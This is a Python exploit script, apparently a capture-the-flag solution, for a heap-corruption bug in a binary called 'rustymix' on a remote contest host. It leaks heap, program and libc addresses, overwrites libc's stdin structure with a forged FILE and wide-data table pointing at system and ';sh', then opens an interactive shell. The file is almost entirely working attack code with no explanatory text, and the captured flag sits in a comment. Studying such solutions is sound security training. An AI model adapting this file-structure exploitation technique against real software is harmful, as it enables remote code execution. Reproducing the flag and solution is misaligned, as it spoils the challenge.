#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './rustymix'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'flu.xxx', 'port':10130})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
ofs_stdout          = binf.symbols['stdout']

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_stderr         = libc.symbols['_IO_2_1_stderr_']

#==========

def attack(conn, **kwargs):
    rx = RustyMix(conn)

    rx.create(1)
    rx.put(0, 0, 0)
    rx.put(0, 2<<16, 0)

    rx.create(1)
    rx.create(2)
    rx.create(1)
    rx.create(1)

    leak  = rx.show(3)
    leak |= rx.show(4) << 32
    addr_heap_base = leak - 0x410
    info('addr_heap_base    = 0x{:012x}'.format(addr_heap_base))

    rx.put(1, 0, 0)
    rx.put(1, 1, (addr_heap_base+0x358-0x34) & ((1<<32)-1))
    rx.put(1, 2, addr_heap_base >> 32)

    rx.put(3, 0, (addr_heap_base+0x480) & ((1<<32)-1))
    rx.fetch(3, 0)

    rx.put(4, 0, (addr_heap_base+0x2c0-0x34) & ((1<<32)-1))

    rx.fetch(1, 0)
    leak = rx.show(1)
    rx.fetch(1, 0x41)
    leak |= rx.show(1) << 32
    addr_stdout = leak

    binf.address = addr_stdout - ofs_stdout
    info('addr_binf_base    = 0x{:012x}'.format(binf.address))
    addr_stderr          = binf.symbols['stderr']

    rx.put(4, 0, (addr_stderr-0x34-2) & ((1<<32)-1))
    rx.put(4, 1, addr_stderr >> 32)

    rx.fetch(1, 0)
    leak = rx.show(1) >> 16
    rx.fetch(1, 0x10000)
    leak |= rx.show(1) << 16
    addr_libc_stderr = leak

    libc.address = addr_libc_stderr - ofs_libc_stderr
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_stdin         = libc.symbols['_IO_2_1_stdin_']
    addr_libc_wfile_jumps   = libc.symbols['_IO_wfile_jumps']
    addr_libc_lock_0        = libc.address + 0x21ba80 # libc.symbols['_IO_stdfile_0_lock']
    addr_libc_wide_data_0   = addr_libc_stdin + 0xe0 # libc.symbols['_IO_wide_data_0']

    rx.put(3, 1, (addr_libc_system) & ((1<<32)-1))
    rx.put(3, 2, addr_libc_system >> 32)

    rx.put(4, 0, (addr_libc_stdin+4-0x34) & ((1<<32)-1))
    rx.put(4, 1, addr_libc_stdin >> 32)
    rx.put(1, 0, u(b';sh\x00'))

    rx.put(4, 0, (addr_libc_stdin-0x34) & ((1<<32)-1))
    rx.put(1, 0, 0xfbad208b & ~0x80a)

    rx.put(4, 0, (addr_libc_stdin+0x40-0x34) & ((1<<32)-1))
    rx.put(1, 0, (addr_libc_stdin+0x1d0) & ((1<<32)-1))

    fake_file  = b'\x00'*5
    fake_file += p64(addr_libc_lock_0)
    fake_file += b'\x00'*0x10
    fake_file += p64(addr_libc_wide_data_0)
    fake_file += b'\x00'*0x18
    fake_file += p32(1)
    fake_file += b'\x00'*0x14
    fake_file += p64(addr_libc_wfile_jumps)

    fake_wide  = b'\x00'*0x20
    fake_wide += p64(1)
    fake_wide += b'\x00'*0xb8
    fake_wide += p64(addr_heap_base+0x4f8 - 0x68)

    conn.sendafter(b'> ', fake_file + fake_wide)

class RustyMix:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def create(self, ty):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'> ', str(ty).encode())

    def put(self, hd, key, val):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'> ', str(hd).encode())
        self.sendlineafter(b'> ', str(key).encode())
        self.sendlineafter(b'> ', str(val).encode())

    def fetch(self, hd, key):
        self.sendlineafter(b'> ', b'3')
        self.sendlineafter(b'> ', str(hd).encode())
        self.sendlineafter(b'> ', str(key).encode())

    def show(self, hd):
        self.sendlineafter(b'> ', b'4')
        self.sendlineafter(b'> ', str(hd).encode())
        self.recvuntil(b'Value: ')
        return int(self.recvline())

    def exit(self):
        self.sendlineafter(b'> ', b'5')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag{i_th0ugt_i_could_ju5t_use_a_l1ttl3_rust_1n_my_c}

if __name__=='__main__':
    main()

#==========
